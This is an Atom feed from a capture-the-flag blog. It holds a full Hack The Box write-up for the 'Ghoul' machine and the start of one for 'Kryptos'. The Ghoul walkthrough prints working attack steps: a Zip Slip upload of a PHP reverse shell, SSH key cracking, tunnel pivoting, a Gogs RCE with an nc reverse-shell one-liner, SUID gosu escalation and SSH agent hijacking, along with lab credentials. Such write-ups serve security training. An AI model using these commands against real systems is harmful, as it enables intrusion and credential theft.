<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-10-10T08:15:47+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Highway to Root</title><subtitle>...because everybody needs to know how deep the rabbit-hole goes.</subtitle><author><name>Michele Campobasso, Jacopo Cortellazzi, Andrea Melis</name></author><entry><title type="html">Ghoul - 10.10.10.101</title><link href="http://localhost:4000/2019/10/04/ghoul/" rel="alternate" type="text/html" title="Ghoul - 10.10.10.101" /><published>2019-10-04T00:00:00+02:00</published><updated>2019-10-04T00:00:00+02:00</updated><id>http://localhost:4000/2019/10/04/ghoul</id><content type="html" xml:base="http://localhost:4000/2019/10/04/ghoul/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;p&gt;As usual we always start with &lt;strong&gt;Nmap&lt;/strong&gt; scanning:&lt;/p&gt;

&lt;pre&gt;root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report

&lt;/pre&gt;

&lt;p&gt;Due to the fact that there doesn’t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.&lt;/p&gt;

&lt;pre&gt; /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s

/index.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/contact.html (Status: 200)
/archives (Status: 301)
/uploads (Status: 301)
/users (Status: 301)
/css (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/less (Status: 301)
/server-status (Status: 403)
&lt;/pre&gt;

&lt;p&gt;This reveals an interesting page, secret.php.
It shows a chat between system admins  talking about an RCE on the current infrastructure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/secret_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the fact that the enumeration didn’t show anything else interesting here I swapped port and went to port 8080. I then tried &lt;strong&gt;admin:admin&lt;/strong&gt; and it worked, revealing a website for uploading images or zip files on the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/zip_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.&lt;/p&gt;

&lt;p&gt;The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:&lt;/p&gt;

&lt;pre&gt;
zip ziplib_www.zip ../../../../../var/www/html/rev.php
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/zip_slip_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/rev_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro.
LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users.
Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:&lt;/p&gt;

&lt;pre&gt; python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup &lt;/pre&gt;

&lt;p&gt;After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.&lt;/p&gt;

&lt;pre&gt;cewl http://10.10.10.101/secret.php &amp;gt; cewl.txt&lt;/pre&gt;

&lt;p&gt;And finally I got it cracked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ssh_pswd_5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ssh decryption password for kaneki ssh is &lt;strong&gt;ILoveTouka&lt;/strong&gt; and I am finally able to login as kaneki. 
Got user !&lt;/p&gt;

&lt;p&gt;user.txt
7c0f11041f210f4f7d1711d40a1c35c2&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;p&gt;The first thing to notice are two notes present into the home folder of kaneki:&lt;/p&gt;

&lt;pre&gt;note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts

notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.&lt;/pre&gt;

&lt;p&gt;These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.&lt;/p&gt;

&lt;p&gt;Indeed, looking at ifconfig:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ifconfig_6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So apparently there is an internal network 172.20.0.0/24 and we need to explore it.
Indeed, after uploading nmap and having run:&lt;/p&gt;

&lt;pre&gt;nmap -p-  172.20.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00026s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.00028s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00030s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh&lt;/pre&gt;

&lt;p&gt;Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file:
/usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :&lt;/p&gt;

&lt;pre&gt; user username=&quot;admin&quot; password=&quot;test@aogiri123&quot; roles=&quot;admin&quot; &lt;/pre&gt;

&lt;p&gt;Maybe it would be usefull later on.
So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:&lt;/p&gt;

&lt;pre&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl &lt;b&gt;kaneki_pub@kaneki-pc&lt;/b&gt;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri&lt;/pre&gt;

&lt;p&gt;Acknoweldging that we are currently into the Aogiri host, guess drives me to say that probably 172.20.0.150 is kaneki-pc. 
I tried then to use the current private ssh key present into the ssh folder of kaneki to connect to the remote host:&lt;/p&gt;

&lt;pre&gt;kaneki@Aogiri:~/.ssh$ ssh -i id_rsa kaneki_pub@172.20.0.150&lt;/pre&gt;

&lt;p&gt;Using the same password as before .. and it worked, I am in!
I noticed then another text file:&lt;/p&gt;

&lt;pre&gt;to-do.txt : Give AogiriTest user access to Eto for git.&lt;/pre&gt;

&lt;p&gt;This means that there is a git repo somewhere on one of these hosts, which could contain interesting info. Moreover, looking at ifconfig, I noticed that this box is connected to a new subnet,172.18.0.0/24:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/ifconfig_7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to upload nmap also on this box, I used an ssh tunneling:&lt;/p&gt;

&lt;pre&gt;ssh -L 9000:172.20.0.150:22 -i ./Backups/kaneki.backup  kaneki@10.10.10.101
scp -P9000 -i id_rsa ./nmap kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;

&lt;p&gt;And in this way I have been able to successfully upload nmap to kaneki-pc ( 172.20.0.150 ).&lt;/p&gt;

&lt;pre&gt;kaneki_pub@kaneki-pc:/tmp$ ./nmap -p- 172.18.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-06 13:14 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.18.0.1)
Host is up (0.00023s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2222/tcp  open  unknown
8080/tcp  open  http-alt
10007/tcp open  unknown

Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00028s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown - HTTP

Nmap scan report for kaneki-pc (172.18.0.200)
Host is up (0.00030s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
&lt;/pre&gt;

&lt;p&gt;As it is possible to observer, there is a new host ,172.18.0.2, with ssh and http open on port 3000. In order to check what  is present on that server, I had to tunnel again over ssh, using this time the existing tunnel already present.&lt;/p&gt;

&lt;pre&gt;ssh -L 9100:172.18.0.2:3000 -i id_rsa  kaneki_pub@localhost -p 9000 &lt;/pre&gt;

&lt;p&gt;And we can see a login screen of Gogs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/web_8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After enormous time spent bruteforcing the credentials I just tried to use all users and passwords already found on the box and I finally found the right combination.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AogiriTest:test@aogiri123&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/gogs_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From a previous note we know there is a vulnerability on gogs so google is our best friend here..
And I found this coll github repo with Poc : https://github.com/TheZ3ro/gogsownz.
So mainly we are able to obtain a RCE on gogs. Let’s try to obtain a reverse shell!&lt;/p&gt;

&lt;p&gt;After having uploaded netcat through scp :&lt;/p&gt;

&lt;pre&gt; scp -P9000 -i id_rsa ./ncat kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;

&lt;p&gt;and having started a local listener we run the following command:&lt;/p&gt;

&lt;pre&gt;python3 gogsownz.py http://127.0.0.1:9100/ -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 172.18.0.200 8000 &amp;gt;/tmp/f'  --cleanup&lt;/pre&gt;

&lt;p&gt;And I am git on 172.18.0.2!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/root_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the system I noticed that there is only one user except root, which git, which seems mandatory for Gogs. This seems pointless so go on with enumeration!
Let’s try with classical Linux enumeration files using  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Running enumeration for SUID binaries we see something interesting:&lt;/p&gt;

&lt;pre&gt;/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/expiry
&lt;b&gt;/usr/sbin/gosu&lt;/b&gt;
/bin/su&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/gosu_10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So just running:&lt;/p&gt;

&lt;pre&gt;gosu root bash&lt;/pre&gt;

&lt;p&gt;allows to become root.&lt;/p&gt;

&lt;p&gt;Going into the /root folder I can see interesting information:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/root_12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have new credentials :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;kaneki:12345ILoveTouka!!!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I tried to log in into Gogs with those but there is only a gogstest report, totally empty and useless. Lets focus on the other file: &lt;strong&gt;aogiri-app.7z&lt;/strong&gt;
After having downloaded it locally:&lt;/p&gt;

&lt;pre&gt;chmod 777 aogiri-app.7z
cp aogiri-app.7z /tmp
ncat -l -p 1234 -q 1 &amp;gt; aogiri-app.7z&amp;lt; /dev/null → on 172.18.0.200
cat aogiri-app.7z | nc 172.18.0.200 1234 → on 172.18.0.2
scp -P9000 -i id_rsa kaneki_pub@127.0.0.1:/tmp/aogiri-app.7z  ./aogiri-app.7z &lt;/pre&gt;

&lt;p&gt;I started looking at it closely. It is a git repository. Really interesting.
It seems that initially I found some creds but unfortunately useless :(&lt;/p&gt;

&lt;pre&gt;/src/main/resources# cat application.properties 
server.port=8080
spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
spring.datasource.username=kaneki
spring.datasource.password=jT7Hr$.[nF.)c)4C
server.address=0.0.0.0

spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.ddl-auto = validate

spring.servlet.multipart.enabled=true
spring.servlet.multipart.file-size-threshold=2KB
spring.servlet.multipart.max-file-size=200MB
spring.servlet.multipart.max-request-size=215MB&lt;/pre&gt;

&lt;p&gt;As first we can look at it using common git commands, as log, show,branch etc.. but those are rabbit holes. Indeed, looking at the git logs we can see that there  is a remote git repository !&lt;/p&gt;

&lt;pre&gt;logs/refs/heads/master:0000000000000000000000000000000000000000 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062314 +0530    commit (initial): update readme
logs/refs/heads/master:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062622 +0530    commit: updated dependencies
logs/refs/heads/master:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062722 +0530    commit: added readme
logs/refs/heads/master:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062881 +0530    commit: mysql support
logs/refs/heads/master:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063447 +0530    commit: noro stop doing stupid shit
logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063698 +0530    commit: added service
logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064090 +0530    commit: update dependencies
logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064281 +0530    reset: moving to HEAD^
logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064622 +0530    reset: moving to 0d426b5
logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064718 +0530    reset: moving to b3752e0
logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064792 +0530    commit: added mysql deps
logs/refs/heads/master:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065100 +0530    commit: changed service
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0000000000000000000000000000000000000000 98ecb8ad40e3d47029bfecd3e356d4b880d835e3 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062361 +0530   pull: storing head
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:98ecb8ad40e3d47029bfecd3e356d4b880d835e3 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062429 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062643 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062735 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546062891 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063465 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546063708 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064105 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064304 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064632 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:0d426b533d4f1877f8a114620be8a1294f34ab71 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546064802 +0530   update by push
&lt;b&gt;logs/refs/remotes/origin/master&lt;/b&gt;:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &amp;lt;kaneki@aogiri.htb&amp;gt; 1546065107 +0530   update by push&lt;/pre&gt;

&lt;p&gt;Looking at the configurations, this remote has been hosted by gogs , probably a while ago and we cannot access it anymore. The only hope is that some crucial information has been stored into git objects.
Git objects can be found under .git/objects folder and they are zlib files. Luckily for us, stackoverflow will help ! https://stackoverflow.com/questions/3178566/how-to-deflate-with-a-command-line-tool-to-extract-a-git-object&lt;/p&gt;

&lt;pre&gt;printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - .git/objects/c0/fb67ab3fda7909000da003f4b2ce50a53f43e7 | gunzip → this works!&lt;/pre&gt;

&lt;p&gt;So start trying all the the git objects one by one, taking note for eventual new password appearing, suddenly I got something…&lt;/p&gt;

&lt;pre&gt;
    /.git/objects/41# printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; | cat - * | gunzip | strings

gzip: stdin: unexpected end of file
blob 476
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=root
spring.datasource.password=g_xEN$ZuWD7hJf2G
&lt;/pre&gt;

&lt;p&gt;Tried the new password everywhere… Nein!&lt;/p&gt;

&lt;pre&gt;gzip: stdin: unexpected end of file
blob 478
server.port=8080
spring.datasource.url=jdbc:mysql://localhost:3306/db
spring.datasource.username=kaneki
spring.datasource.password=7^Grc%C\7xEQ?tb4
server.address=0.0.0.0&lt;/pre&gt;

&lt;p&gt;And the new password… works! We are able to become root on 172.20.0.150&lt;/p&gt;

&lt;pre&gt;su : pasword 7^Grc%C\7xEQ?tb4&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/kaneki_13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;…
Ok so we are root on the 172.18.0.200, the only host that is still untouched is the docker server on 172.20.0.1. Maybe on the filesystem there are some info for connect to it.
Run enumeration, nothing.
Lets try conjobs, just run pspy64 and wait a while.
And finally something weird happened:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/Ghoul/pspy_14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems that some other host is passing through this host to reach 172.18.0.1 for a root session on it…interesting
After a bit of googling I got my answer:&lt;/p&gt;

&lt;p&gt;https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/&lt;/p&gt;

&lt;p&gt;So I can Hijack the SSH session. I just need to be fast.&lt;/p&gt;

&lt;pre&gt;SSH_AUTH_SOCK=/tmp/ssh-e6wtZlMHTY/agent.1061 ssh root@172.18.0.1 -p 2222&lt;/pre&gt;

&lt;p&gt;finally root…
&lt;img src=&quot;/images/Ghoul/root_15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;who-ate-the-ghoul--thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-&quot;&gt;Who ate the Ghoul ? Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)&lt;/h4&gt;</content><author><name>Jacopo Cortellazzi</name></author><summary type="html">USER</summary></entry><entry><title type="html">Kryptos - 10.10.10.129</title><link href="http://localhost:4000/2019/09/27/kryptos/" rel="alternate" type="text/html" title="Kryptos - 10.10.10.129" /><published>2019-09-27T00:00:00+02:00</published><updated>2019-09-27T00:00:00+02:00</updated><id>http://localhost:4000/2019/09/27/kryptos</id><content type="html" xml:base="http://localhost:4000/2019/09/27/kryptos/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;

&lt;h3 id=&quot;nmap&quot;&gt;NMAP&lt;/h3&gt;

&lt;p&gt;We start from a comprehensive scan with &lt;strong&gt;Nmap&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;root@pentestbox:~# nmap -sV -sC -sS -p- 10.10.10.129 -A

Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-27 13:13 CEST
Nmap scan report for kryptos.htb (10.10.10.129)
Host is up (0.043s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
&lt;b&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/b&gt;
| ssh-hostkey: 
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
&lt;b&gt;80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&lt;/b&gt;
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=9/27%OT=22%CT=1%CU=35711%PV=Y%DS=2%DC=T%G=Y%TM=5D8DEEF
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=108%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(O1=M54BST11NW7%O2=M54BST11NW7%O
OS:3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   30.50 ms 10.10.16.1
2   15.71 ms kryptos.htb (10.10.10.129)&lt;/pre&gt;

&lt;p&gt;From this, it is possible to see that there’s two services exposed, &lt;strong&gt;ssh&lt;/strong&gt; and a &lt;strong&gt;webserver&lt;/strong&gt;. Since we don’t own any credential for ssh yet, we’ll explore the webserver first.&lt;/p&gt;

&lt;h3 id=&quot;dirbuster&quot;&gt;DirBuster&lt;/h3&gt;

&lt;p&gt;By quickly visiting the HTTP server, we face a login page. First, we try to gather more information by finding pages available on such webserver through &lt;strong&gt;DirBuster&lt;/strong&gt;. We can use a lowercase wordlist such as &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt&lt;/code&gt; because Apache is case insensitive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/kryptos/dirbuster.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

